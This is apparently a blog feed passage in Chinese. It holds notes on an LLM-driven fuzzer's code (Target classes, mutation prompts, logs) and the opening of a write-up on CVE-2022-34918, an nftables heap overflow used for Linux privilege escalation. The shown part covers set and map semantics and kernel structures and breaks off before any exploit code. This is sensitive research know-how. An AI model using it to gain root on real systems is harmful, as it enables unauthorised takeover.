title="make_target_with_config"></a>make_target_with_config</h3><ul><li><p>target_compat_dict：一个压缩过的config_dict</p><ul><li>language</li><li>folder：output_folder</li><li>bs：batch_size</li><li>temperature</li><li>device</li><li>model_name</li><li>max_length</li><li>use_hw：use_hand_written_prompt</li><li>no_input_prompt</li><li>prompt_strategy</li><li>level：log_level</li><li>template：fuzzing_with_config_file</li><li>config_dict：完整的config_dict，解析自配置文件</li><li>target_name</li></ul></li><li><p>根据语言创建对应Target实例，并返回Target实例：</p><ul><li>cpp：CPPTarget</li><li>c：CTarget</li><li>qiskit：QiskitTarget</li><li>smt2：SMTTarget</li><li>go：GOTarget</li><li>java：JAVATarget</li></ul><p><em>Target见target&#x2F;target.py，子类见子文件夹</em></p></li></ul><h2 id="target"><a href="#target" class="headerlink" title="target"></a>target</h2><h3 id="target-py"><a href="#target-py" class="headerlink" title="target.py"></a>target.py</h3><h4 id="class-Target"><a href="#class-Target" class="headerlink" title="class Target"></a>class Target</h4><p>参数是make_target_with_config中的target_compat_dict</p><h5 id="init-1"><a href="#init-1" class="headerlink" title="__init__"></a>__init__</h5><p>language，timeout，folder，</p><ul><li><p>language</p></li><li><p>timeout</p></li><li><p>folder</p></li><li><p>CURRENT_TIME：获取现在时间</p></li><li><p>batch_size</p></li><li><p>temperature</p></li><li><p>max_length</p></li><li><p>device</p></li><li><p>model_name</p></li><li><p>model：None</p></li><li><p>g_logger：结果目录下的log_generation.txt文件，格式：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">f&quot;[<span class="hljs-subst">&#123;level.name&#125;</span>] <span class="hljs-subst">&#123;msg&#125;</span>&quot;</span><br></code></pre></td></tr></table></figure><p>例子：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs shell">[VERBOSE] #include &lt;stdlib.h&gt;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">include &lt;stdio.h&gt;</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">include &lt;inttypes.h&gt;</span><br><br><br>int main(void) &#123;<br>    unsigned i = 1l;<br><span class="hljs-meta prompt_">#</span><span class="language-bash">ifdef UINTPTR_MAX</span><br>    printf(&quot;Unsigned integers are %zu bytes.\n&quot;, sizeof(i));<br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-keyword">else</span></span><br>    printf(&quot;Unsigned integers are %zd bytes.\n&quot;, sizeof(i)*CHAR_BIT);<br><span class="hljs-meta prompt_">#</span><span class="language-bash">endif</span><br>    i++;<br>    printf(&quot;unsigned i is now %zd bytes long.\n&quot;, sizeof(i))*CHAR_BIT;<br>    printf(&quot;unsigned i is now %&quot; PRIu64 &quot;\n&quot;, i);<br>    return 0;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>v_logger：结果目录下的log_validation.txt文件，例子：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell">[TRACE] Validating outputs/full_run/gcc/0.fuzz ...<br>[VERBOSE] outputs/full_run/gcc/0.fuzz failed validation with error message: outputs/full_run/gcc/0.fuzz: In function main:<br>outputs/full_run/gcc/0.fuzz:15:62: error: CHAR_BIT undeclared (first use in this function)<br>   15 |     printf(&quot;unsigned i is now %zd bytes long.\n&quot;, sizeof(i))*CHAR_BIT;<br>      |                                                              ^~~~~~~~<br>outputs/full_run/gcc/0.fuzz:5:1: note: CHAR_BIT is defined in header &lt;limits.h&gt;; did you forget to #include &lt;limits.h&gt;?<br>    4 | #include &lt;inttypes.h&gt;<br>  +++ |+#include &lt;limits.h&gt;<br>    5 |<br>outputs/full_run/gcc/0.fuzz:15:62: note: each undeclared identifier is reported only once for each function it appears in<br>   15 |     printf(&quot;unsigned i is now %zd bytes long.\n&quot;, sizeof(i))*CHAR_BIT;<br>      |                                                              ^~~~~~~~<br></code></pre></td></tr></table></figure></li><li><p>m_logger：结果目录下的log.txt文件，例子：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">[INFO] Loading model ...<br>[INFO] Initializing ... this may take a while ...<br>[INFO] Loading model ...<br>[INFO] Model Loaded<br>[INFO] Use auto-prompting prompt ...<br>[INFO] Initializing ... this may take a while ...<br>[INFO] Loading model ...<br>[INFO] Model Loaded<br>[INFO] Use auto-prompting prompt ...<br>[INFO] Done<br></code></pre></td></tr></table></figure></li><li><p>SYSTEM_MESSAGE：子类设置</p></li><li><p>AP_SYSTEM_MESSAGE：系统提示prompt</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;You are an auto-prompting tool&quot;</span><br></code></pre></td></tr></table></figure></li><li><p>AP_INSTRUCTION：生成命令prompt</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;Please summarize the above documentation in a concise manner to describe the usage and &quot;</span><br><span class="hljs-string">&quot;functionality of the target &quot;</span><br></code></pre></td></tr></table></figure></li><li><p>hw：use_hand_written_prompt</p></li><li><p>no_input_prompt</p></li><li><p>prompt_used：子类设置</p></li><li><p>prompt：None</p></li><li><p>initial_prompt：None</p></li><li><p>prev_example：None</p></li><li><p>se_prompt：语法等价替换变异策略的prompt</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">self.se_prompt = self.wrap_in_comment(<br>    <span class="hljs-string">&quot;Please create a semantically equivalent program to the previous &quot;</span><br>    <span class="hljs-string">&quot;generation&quot;</span><br>)<br></code></pre></td></tr></table></figure></li><li><p>m_prompt：变异之前的代码变异策略的prompt</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">self.m_prompt = self.wrap_in_comment(<br>    <span class="hljs-string">&quot;Please create a mutated program that modifies the previous generation&quot;</span><br>)<br></code></pre></td></tr></table></figure></li><li><p>c_prompt：结合之前两段代码变异策略的prompt</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">self.c_prompt = self.wrap_in_comment(<br>    <span class="hljs-string">&quot;Please combine the two previous programs into a single program&quot;</span><br>)<br></code></pre></td></tr></table></figure></li><li><p>p_strategy：prompt_strategy</p></li><li><p>special_eos：None</p></li><li><p>target_name：target</p></li></ul><h5 id="create-prompt-from-config"><a href="#create-prompt-from-config" class="headerlink" title="_create_prompt_from_config"></a>_create_prompt_from_config</h5><p>从config获取各种prompt</p><ul><li><p>target：配置文件的target，提供</p><ul><li>path_documentation</li><li>path_example_code</li><li>trigger_to_generate_input</li><li>input_hint</li><li>path_hand_written_prompt</li><li>target_string</li></ul></li><li><p>trigger_to_generate_input：见配置文件</p></li><li><p>documentation：读取自path_documentation</p></li><li><p>example_code：读取自path_example_code</p></li><li><p>input_hint：见配置文件</p></li><li><p>hand_written_prompt：读取自path_hand_written_prompt</p></li><li><p>target_string：见配置文件</p></li><li><p>dict_compat：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">dict_compat = &#123;<br>    <span class="hljs-string">&quot;docstring&quot;</span>: documentation,<br>    <span class="hljs-string">&quot;example_code&quot;</span>: example_code,<br>    <span class="hljs-string">&quot;separator&quot;</span>: trigger_to_generate_input,<br>    <span class="hljs-string">&quot;begin&quot;</span>: input_hint,<br>    <span class="hljs-string">&quot;hw_prompt&quot;</span>: hand_written_prompt,<br>    <span class="hljs-string">&quot;target_api&quot;</span>: target_string,<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><p>返回dict_compat</p><h5 id="validate-prompt"><a href="#validate-prompt" class="headerlink" title="validate_prompt"></a>validate_prompt</h5><p>给prompt打分</p><ul><li><p>调用generate使用prompt生成</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">fos = self.model.generate(<br>    prompt,<br>    batch_size=self.batch_size,<br>    temperature=self.temperature,<br>    max_length=self.max_length,<br>)<br></code></pre></td></tr></table></figure><p><em>generate见model.py</em></p></li><li><p>对于每个output：</p><ul><li><p>补充begin，为了编译或运行之后会去掉</p></li><li><p>将output写回文件</p></li><li><p>调用validate_individual验证输出，就是编译或运行</p></li><li><p>如果output：</p><ul><li>验证为SAFE</li><li>包含目标api，filter清除begin</li><li>clean_code清除注释和空行后不在set里</li></ul><p>则放入set，score+1</p></li></ul></li><li><p>返回score</p></li></ul><h5 id="auto-prompt"><a href="#auto-prompt" class="headerlink" title="auto_prompt"></a>auto_prompt</h5><p>生成初始prompt</p><ul><li><p>工作路径下创建prompt文件夹</p></li><li><p>如果已经有prompt，则直接使用</p></li><li><p>如果设置了no_input_prompt，则直接使用prompt_used中的separator和begin作为best_prompt</p></li><li><p>如果设置了use_hand_written_prompt，则使用hand written prompt</p></li><li><p>否则自动生成prompt</p></li><li><p>调用create_config生成config，temperature为0</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">config = &#123;<br>    <span class="hljs-string">&quot;model&quot;</span>: <span class="hljs-string">&quot;gpt-3.5-turbo&quot;</span>,<br>    <span class="hljs-string">&quot;max_token&quot;</span>: <span class="hljs-number">500</span>,<br>    <span class="hljs-string">&quot;temperature&quot;</span>: <span class="hljs-number">0.0</span>,<span class="hljs-comment"># risk</span><br>    <span class="hljs-string">&quot;message&quot;</span>: [<br>        &#123;<span class="hljs-string">&quot;role&quot;</span>: <span class="hljs-string">&quot;system&quot;</span>, <span class="hljs-string">&quot;content&quot;</span>: self.AP_SYSTEM_MESSAGE&#125;,<br>        &#123;<span class="hljs-string">&quot;role&quot;</span>: <span class="hljs-string">&quot;user&quot;</span>, <span class="hljs-string">&quot;content&quot;</span>: message + <span class="hljs-string">&#x27;\n&#x27;</span> + self.AP_INSTRUCTION&#125; <span class="hljs-comment"># message是文档</span><br>    ]<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>调用request_engine获取gpt的response</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">response = request_engine(config)<br></code></pre></td></tr></table></figure></li><li><p>选取第一个message作为greedy_prompt</p></li><li><p>best_prompt初始化为greedy_prompt，调用validate_prompt给greedy_prompt打分，score表示有效输出的个数，具体为包含目标api的、不重复的output数量</p></li><li><p>重复三次request_engine（temperature为1）和validate_prompt选取分数最高的prompt作为best_prompt</p></li></ul><h5 id="initialize"><a href="#initialize" class="headerlink" title="initialize"></a>initialize</h5><p>target初始化，加载模型，初始化prompt</p><ul><li><p>初始化一个eos列表，这些prompt根据需要作为语句结尾</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">[<br>    trigger_to_generate_input,<br>    <span class="hljs-string">&quot;&lt;eom&gt;&quot;</span>, <span class="hljs-comment"># for codegen2</span><br>    se_prompt,<br>    m_prompt,<br>    c_prompt<br>]<br></code></pre></td></tr></table></figure></li><li><p>添加special_eos，go和smt有这个</p></li><li><p>调用make_model加载模型</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">self.model = make_model(<br>    eos=eos,<br>    model_name=model_name,<br>    device=self.device,<br>    max_length=self.max_length,<br>)<br></code></pre></td></tr></table></figure><p><em>make_model见model.py</em></p></li><li><p>调用auto_prompt获取initial_prompt</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">self.initial_prompt = self.auto_prompt(<br>    message=self.prompt_used[<span class="hljs-string">&quot;docstring&quot;</span>],<br>    hw_prompt=self.prompt_used[<span class="hljs-string">&quot;hw_prompt&quot;</span>] <span class="hljs-keyword">if</span> self.hw <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span>,<br>    hw=self.hw,<br>    no_input_prompt=self.no_input_prompt,<br>)<br></code></pre></td></tr></table></figure><p>参数：</p><ul><li>message：文档</li><li>hw_prompt：一些写好的prompt</li><li>hw：是否使用hand written prompt</li><li>no_input_prompt：不需要输入prompt</li></ul></li></ul><h5 id="update-strategy"><a href="#update-strategy" class="headerlink" title="update_strategy"></a>update_strategy</h5><p>选择一个变异策略，生成新的prompt</p><ul><li><p>0：new_code+trigger_to_generate_input</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">f&quot;\n<span class="hljs-subst">&#123;new_code&#125;</span>\n<span class="hljs-subst">&#123;self.prompt_used[<span class="hljs-string">&#x27;separator&#x27;</span>]&#125;</span>\n&quot;</span><br></code></pre></td></tr></table></figure></li><li><p>1：变异new_code</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">f&quot;\n<span class="hljs-subst">&#123;new_code&#125;</span>\n<span class="hljs-subst">&#123;self.m_prompt&#125;</span>\n&quot;</span><br></code></pre></td></tr></table></figure></li><li><p>2：语法等价new_code</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">f&quot;\n<span class="hljs-subst">&#123;new_code&#125;</span>\n<span class="hljs-subst">&#123;self.se_prompt&#125;</span>\n&quot;</span><br></code></pre></td></tr></table></figure></li><li><p>3：结合前两个生成的代码：</p><ul><li>prev_example</li><li>trigger_to_generate_input</li><li>input_hint</li><li>new_code</li><li>combine prompt</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">f&quot;\n<span class="hljs-subst">&#123;self.prev_example&#125;</span>\n<span class="hljs-subst">&#123;self.prompt_used[<span class="hljs-string">&#x27;separator&#x27;</span>]&#125;</span>\n<span class="hljs-subst">&#123;self.prompt_used[<span class="hljs-string">&#x27;begin&#x27;</span>]&#125;</span>\n<span class="hljs-subst">&#123;new_code&#125;</span>\n<span class="hljs-subst">&#123;self.c_prompt&#125;</span>\n&quot;</span><br></code></pre></td></tr></table></figure></li></ul><h5 id="update"><a href="#update" class="headerlink" title="update"></a>update</h5><p>每轮fuzz loop后更新target</p><ul><li><p>选择最后一个filter合法、clean_code后不等于prev_example的code</p></li><li><p>更新prompt为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">self.prompt = (<br>    self.initial_prompt<br>    + self.update_strategy(new_code)<br>    + self.prompt_used[<span class="hljs-string">&quot;begin&quot;</span>]<br>    + <span class="hljs-string">&quot;\n&quot;</span><br>)<br></code></pre></td></tr></table></figure></li><li><p>更新prev_example为code</p></li></ul><h3 id="C-py"><a href="#C-py" class="headerlink" title="C.py"></a>C.py</h3><h4 id="class-CTarget"><a href="#class-CTarget" class="headerlink" title="class CTarget"></a>class CTarget</h4><h5 id="init-2"><a href="#init-2" class="headerlink" title="__init__"></a>__init__</h5><ul><li><p>SYSTEM_MESSAGE：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;You are a C Fuzzer&quot;</span><br></code></pre></td></tr></table></figure></li><li><p>config_dict</p></li><li><p>prompt_used：调用_create_prompt_from_config生成，包括</p><ul><li>docstring：文档</li><li>example_code：示例代码</li><li>separator：trigger_to_generate_input，见配置文件</li><li>begin：input_hint，见配置文件</li><li>hw_prompt：写好的prompt</li><li>target_api：测试目标</li></ul><p><em>_create_prompt_from_config见target&#x2F;target.py</em></p></li></ul><h5 id="wrap-prompt"><a href="#wrap-prompt" class="headerlink" title="wrap_prompt"></a>wrap_prompt</h5><p>prompt打包</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* prompt */</span><br>trigger_to_generate_input<br>input_hint<br></code></pre></td></tr></table></figure><p>示例：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* prompt */</span><br><span class="hljs-comment">/* Please create a short program which uses new C features in a complex way */</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Fuzz</category>
      
    </categories>
    
    
    <tags>
      
      <tag>fuzz</tag>
      
      <tag>llm</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2022-34918 nftables堆溢出</title>
    <link href="/2025/01/07/cve-2022-34918/"/>
    <url>/2025/01/07/cve-2022-34918/</url>
    
    <content type="html"><![CDATA[<ul><li><strong>影响版本</strong>：原作者在Ubuntu 22.04（5.15.0）上成功提权，本篇使用5.17.15</li><li>利用条件：CAP_NET_ADMIN</li></ul><p>参考：<a href="https://bsauce.github.io/2022/07/26/CVE-2022-34918/">【kernel exploit】CVE-2022-34918 nftable堆溢出漏洞利用（list_head任意写）</a></p><p>背疼o(╥﹏╥)o</p><span id="more"></span><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="set，map，vmap"><a href="#set，map，vmap" class="headerlink" title="set，map，vmap"></a>set，map，vmap</h2><ul><li><p>set</p><ul><li>操作行为<ul><li>add</li><li>delete</li><li>destroy</li><li>list</li><li>flush</li><li>reset</li></ul></li><li>集合规格<ul><li>type（string）：ipv4_addr，ipv6_addr，ether_addr，inet_proto，inet_service，mark</li><li>typeof（expression）</li><li>flags（string）：constant，dynamic，interval，timeout</li><li>timeout： string, decimal followed by unit (d, h, m, s)</li><li>gc-interval：string, decimal followed by unit (d, h, m, s)</li><li>elements：depends on ‘type’</li><li>size：unsigned integer（64 bit）</li><li>policy（string）：performance（default），memory</li><li>auto-merge：boolean or specific parameters</li></ul></li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">add <span class="hljs-built_in">set</span> [family] table <span class="hljs-built_in">set</span> &#123; <span class="hljs-built_in">type</span> <span class="hljs-built_in">type</span> | typeof expression ; [flags flags ;] [<span class="hljs-built_in">timeout</span> <span class="hljs-built_in">timeout</span> ;] [gc-interval gc-interval ;] [elements = &#123; element[, ...] &#125; ;] [size size ;] [comment comment ;] [policy policy ;] [auto-merge ;] &#125;</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">&#123;delete | destroy | list | flush | reset &#125; <span class="hljs-built_in">set</span> [family] table <span class="hljs-built_in">set</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">list sets [family]</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">delete <span class="hljs-built_in">set</span> [family] table handle handle</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">&#123;add | delete | destroy &#125; element [family] table <span class="hljs-built_in">set</span> &#123; element[, ...] &#125;</span><br></code></pre></td></tr></table></figure></li><li><p>map</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">add map [family] table map &#123; <span class="hljs-built_in">type</span> <span class="hljs-built_in">type</span> | typeof expression [flags flags ;] [elements = &#123; element[, ...] &#125; ;] [size size ;] [comment comment ;] [policy policy ;] &#125;</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">&#123;delete | destroy | list | flush | reset &#125; map [family] table map</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">list maps [family]</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">&#123;add | create | delete | destroy | get | reset &#125; element [family] table <span class="hljs-built_in">set</span> &#123; ELEMENT[, ...] &#125;</span><br>ELEMENT := key_expression OPTIONS [: value_expression]<br>OPTIONS := [timeout TIMESPEC] [expires TIMESPEC] [comment string]<br>TIMESPEC := [numd][numh][numm][num[s]]<br></code></pre></td></tr></table></figure></li><li><p>vmaps：将元素直接映射到裁决（verdict）语句上，裁决语句决定了当匹配到特定规则时应该采取的动作，比如accept、reject或drop</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">nft add map table-name map-name &#123; <span class="hljs-built_in">type</span> inet_proto : verdict \; &#125;</span><br></code></pre></td></tr></table></figure><p>其实就是一种特殊的map</p></li></ul><h2 id="相关源码分析"><a href="#相关源码分析" class="headerlink" title="相关源码分析"></a>相关源码分析</h2><p>以上三个都是用set实现的</p><h3 id="nftables创建集合"><a href="#nftables创建集合" class="headerlink" title="nftables创建集合"></a>nftables创建集合</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">nft add <span class="hljs-built_in">set</span> inet my_table my_set &#123; <span class="hljs-built_in">type</span> ipv4_addr \; &#125;</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">nft list sets</span><br>table inet my_table &#123;<br>        set my_set &#123;<br>                type ipv4_addr<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>向集合中添加元素</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">nft add element inet my_table my_set &#123; 10.10.10.22, 10.10.10.33 &#125;</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">nft list <span class="hljs-built_in">set</span> inet my_table my_set</span><br>table inet my_table &#123;<br>        set my_set &#123;<br>                type ipv4_addr<br>                elements = &#123; 10.10.10.22, 10.10.10.33 &#125;<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>引用集合</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">nft insert rule inet my_table my_filter_chain ip saddr @my_set drop</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">nft list chain inet my_table my_filter_chain</span><br>table inet my_table &#123;<br>        chain my_filter_chain &#123;<br>                type filter hook input priority 0; policy accept;<br>                ip saddr @my_set drop<br>                tcp dport http accept<br>                tcp dport nfs accept<br>                tcp dport ssh accept<br>                ip saddr &#123; 10.10.10.123, 10.10.10.231 &#125; accept<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>详情见<a href="https://akaieurus.github.io/2024/02/08/nft%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/#%E9%9B%86%E5%90%88">另一篇博客</a></p><p>创建集合元素的回调函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nfnl_callback</span> <span class="hljs-title">nf_tables_cb</span>[<span class="hljs-title">NFT_MSG_MAX</span>] =</span> &#123;<br>    <span class="hljs-comment">// ……</span><br>    [NFT_MSG_NEWSETELEM] = &#123;<br>        .call= nf_tables_newsetelem,<br>        .type= NFNL_CB_BATCH,<br>        .attr_count= NFTA_SET_ELEM_LIST_MAX,<br>        .policy= nft_set_elem_list_policy,<br>    &#125;,<br>    <span class="hljs-comment">// ……</span><br>&#125;<br></code></pre></td></tr></table></figure><p>分析使用的命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">nft add table inet my_table</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">nft add <span class="hljs-built_in">set</span> inet my_table my_set &#123;<span class="hljs-built_in">type</span> ipv4_addr \;&#125;</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">nft add element inet my_table my_set &#123;10.10.10.22&#125;</span><br></code></pre></td></tr></table></figure><h3 id="nla"><a href="#nla" class="headerlink" title="nla"></a>nla</h3><p>nla相关数据处理</p><h4 id="nf-tables-newsetelem"><a href="#nf-tables-newsetelem" class="headerlink" title="nf_tables_newsetelem"></a>nf_tables_newsetelem</h4><ul><li><p>进入时的参数nla，一个nlattr指针的数组，nlattr的结构如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> *  &lt;------- NLA_HDRLEN ------&gt; &lt;-- NLA_ALIGN(payload)--&gt;</span><br><span class="hljs-comment"> * +---------------------+- - -+- - - - - - - - - -+- - -+</span><br><span class="hljs-comment"> * |        Header       | Pad |     Payload       | Pad |</span><br><span class="hljs-comment"> * |   (struct nlattr)   | ing |                   | ing |</span><br><span class="hljs-comment"> * +---------------------+- - -+- - - - - - - - - -+- - -+</span><br><span class="hljs-comment"> *  &lt;-------------- nlattr-&gt;nla_len --------------&gt;</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nlattr</span> &#123;</span><br>__u16           nla_len;<br>__u16           nla_type;<br>&#125;;<br></code></pre></td></tr></table></figure><p>nla数组的idx和内容对应</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">nft_set_elem_list_attributes</span> 